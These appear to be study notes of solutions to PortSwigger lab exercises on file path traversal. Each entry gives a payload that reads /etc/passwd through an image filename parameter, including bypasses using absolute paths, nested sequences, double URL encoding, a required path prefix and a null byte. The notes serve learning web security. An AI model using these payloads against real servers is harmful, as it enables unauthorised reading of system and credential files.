# Directory traversal

## Labs

### [Lab: File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)

Vulnerable URL: https://domain/image?filename=file

This URL is vulnerable to URL transversal. The parameter `filename=../../../etc/passwd` (relative file path) returns the users file on the server to the front-end

### [Lab: File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)

Vulnerable URL: https://domain/image?filename=file

This URL is vulnerable to URL transversal. The parameter `filename=/etc/passwd` (absolute file path) returns the users file on the server to the front-end

### [Lab: File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)

Vulnerable URL: https://domain/image?filename=file

This URL is vulnerable to URL transversal. The parameter `filename=....//....//....//etc/passwd` (relative file path bypassing str.strip/replace functions) returns the users file on the server to the front-end

### [Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

Vulnerable URL: https://domain/image?filename=file

This URL is vulnerable to URL transversal. The parameter `filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34` (double URL encoded of `../../../etc/passwd` to bypass input validations) returns the users file on the server to the front-end

### [Lab: File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)

Vulnerable URL: https://domain/image?filename=file

This URL is vulnerable to URL transversal. The parameter `filename=/var/www/images/../../../etc/passwd` (relative path bypassing path requirement) returns the users file on the server to the front-end

### [Lab: File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

Vulnerable URL: https://domain/image?filename=file

This URL is vulnerable to URL transversal. The parameter `filename=../../../etc/passwd%00.png` (relative path bypassing file extension requirement with null byte) returns the users file on the server to the front-end
